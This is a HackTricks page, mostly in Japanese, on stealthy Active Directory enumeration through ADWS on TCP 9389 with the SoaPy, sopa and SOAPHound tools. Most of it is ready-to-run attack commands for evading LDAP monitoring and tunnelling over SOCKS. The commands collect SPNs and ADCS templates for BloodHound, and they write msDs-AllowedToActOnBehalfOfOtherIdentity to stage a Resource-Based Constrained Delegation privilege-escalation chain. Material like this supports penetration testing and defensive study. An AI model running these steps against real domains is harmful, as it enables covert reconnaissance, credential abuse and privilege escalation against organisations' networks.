# Active Directory Web Services (ADWS) 列挙とステルス収集

{{#include ../../banners/hacktricks-training.md}}

## ADWSとは？

Active Directory Web Services (ADWS) は **Windows Server 2008 R2以降のすべての Domain Controller でデフォルトで有効化されており**、TCP **9389** をリッスンします。名前に反して、**HTTPは関与しません**。代わりに、このサービスはプロプライエタリな .NET フレーミングプロトコルのスタックを通じて LDAP 風のデータを公開します:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

このトラフィックはこれらのバイナリSOAPフレームにカプセル化され、珍しいポートを介して流れるため、**ADWS を用いた列挙は従来の LDAP/389 & 636 トラフィックに比べて検査、フィルタリング、シグネチャ検出を受ける可能性がはるかに低くなります**。運用者にとってこれは次を意味します:

* よりステルスな recon – Blue teams はしばしば LDAP クエリに注力します。
* SOCKSプロキシを介して 9389/TCP をトンネルすることで、Windows以外のホスト（Linux, macOS）から収集可能。
* LDAP 経由で取得するのと同様のデータ（users, groups, ACLs, schema, etc.）と **writes** を行える能力（例: `msDs-AllowedToActOnBehalfOfOtherIdentity` を **RBCD** 用に設定）。

ADWS のやり取りは WS-Enumeration 上で実装されています：すべてのクエリは LDAP filter/attributes を定義し `EnumerationContext` GUID を返す `Enumerate` メッセージから始まり、その後サーバ定義の結果ウィンドウまでをストリームする 1つ以上の `Pull` メッセージが続きます。コンテキストは約 30 分で失効するため、ツールは結果をページングするかフィルタを分割（CN ごとのプレフィックスクエリ）して状態を失わないようにする必要があります。セキュリティ記述子を要求する際は、SACL を省略するために `LDAP_SERVER_SD_FLAGS_OID` コントロールを指定してください。そうしないと ADWS は SOAP レスポンスから `nTSecurityDescriptor` 属性を単に削除します。

> NOTE: ADWS は多くの RSAT GUI/PowerShell ツールでも使用されているため、トラフィックが正当な管理者活動と混在する可能性があります。

## SoaPy – ネイティブ Python クライアント

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**. NBFX/NBFSE/NNS/NMF フレームをバイト単位で生成し、.NET ランタイムに触れることなく Unix 系システムからの収集を可能にします。

### 主な機能

* Supports **proxying through SOCKS**（C2 インプラントから有用）。
* LDAP と同等の細粒度の検索フィルタ（`-q '(objectClass=user)'`）。
* オプションの **write** 操作（`--set` / `--delete`）。
* BloodHound に直接取り込める **BOFHound output mode**。
* `--parse` フラグは、可読性が必要な場合にタイムスタンプ / `userAccountControl` を整形します。

### ターゲット収集フラグ & 書き込み操作

SoaPy は厳選されたスイッチを同梱しており、ADWS 上で最も一般的な LDAP ハンティングタスクを再現します: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`、およびカスタム取得用の生の `--query` / `--filter`。これらを `--rbcd <source>`（`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定）、`--spn <service/cn>`（ターゲット Kerberoasting のための SPN ステージング）、および `--asrep`（`userAccountControl` 内の `DONT_REQ_PREAUTH` を反転）といった書き込みプリミティブと組み合わせて使用します。

例：`samAccountName` と `servicePrincipalName` のみを返すターゲット化された SPN 探索の例:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
同じホスト/認証情報を使って検出結果をすぐに weaponise: RBCD-capable objects を `--rbcds` でダンプし、次に `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して Resource-Based Constrained Delegation チェーンを stage します（完全な悪用パスは [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - GolangでのADWS向け実用クライアント

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **オブジェクト検索と取得** - `query` / `get`
* **オブジェクトのライフサイクル** - `create [user|computer|group|ou|container|custom]` and `delete`
* **属性編集** - `attr [add|replace|delete]`
* **アカウント管理** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – 高ボリュームのADWS収集 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) は .NET 製のコレクタで、すべてのLDAP操作をADWS内に留め、BloodHound v4互換のJSONを出力します。  
一度 `objectSid`、`objectGUID`、`distinguishedName`、`objectClass` の完全なキャッシュを作成（`--buildcache`）し、その後は高ボリュームの `--bhdump`、`--certdump`（ADCS）、または `--dnsdump`（AD-integrated DNS）パスで再利用するため、約35個の重要な属性のみがDCを離れることになります。AutoSplit（`--autosplit --threshold <N>`）は、大規模フォレストで30分のEnumerationContextタイムアウトを超えないよう、CNプレフィックスごとにクエリを自動で分割します。

ドメイン参加済みのオペレータVMでの典型的なワークフロー:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
エクスポートしたJSONは直接SharpHound/BloodHoundのワークフローに組み込めます—下流のグラフ化アイデアについては[BloodHound methodology](bloodhound.md)を参照してください。AutoSplitにより、SOAPHoundは数百万オブジェクト規模のフォレストでも堅牢性を保ち、クエリ数をADExplorerスタイルのスナップショットより低く抑えます。

## ステルスな AD 収集ワークフロー

以下のワークフローは、ADWS経由で**domain & ADCS objects**を列挙し、それらをBloodHound JSONに変換して証明書ベースの攻撃パスを探索する方法を示します – すべてLinuxから実行します:

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **ルートドメインオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC から ADCS 関連のオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound に変換する:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** を BloodHound GUI にアップロードし、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` のような cypher クエリを実行して、証明書昇格パス（ESC1、ESC8 など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` の書き込み (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
これを `s4u2proxy`/`Rubeus /getticket` と組み合わせて、完全な **Resource-Based Constrained Delegation** チェーンを構築します（参照: [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## ツール概要

| 目的 | ツール | 備考 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## 参考資料

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
